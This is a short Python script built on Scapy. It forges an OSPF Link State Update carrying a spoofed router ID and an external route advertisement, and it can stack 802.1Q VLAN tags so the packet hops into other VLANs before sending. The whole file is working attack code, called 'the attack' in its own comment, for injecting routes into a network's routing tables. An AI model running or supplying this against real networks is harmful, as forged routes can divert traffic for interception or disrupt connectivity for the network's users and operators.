#!venv/bin/python

from scapy.all import *
from scapy.all import IP, Ether, Dot1Q
from scapy.contrib.ospf import *
import settings


# This is the OSPF packet
ip_pkt = IP(src=settings.source_ip,dst=settings.destination_ip, ttl=1)/\
    OSPF_Hdr(type=4, src=settings.ospf_spoofed, area=settings.ospf_area)/\
    OSPF_LSUpd(lsacount=1, lsalist=[OSPF_External_LSA(id=settings.ospf_network_adv, adrouter=settings.ospf_spoofed, mask="255.255.255.0", ebit=1)])

ip_pkt.show()

# This part is used in case you want to add vlan hopping to the attack. In order to injection a route in another VLAN.
dot1_tags = Ether()
for vlan_id in settings.vlans:
    dot1_tags = dot1_tags/Dot1Q(vlan=vlan_id)

sendp(dot1_tags/ip_pkt, iface=settings.source_interface)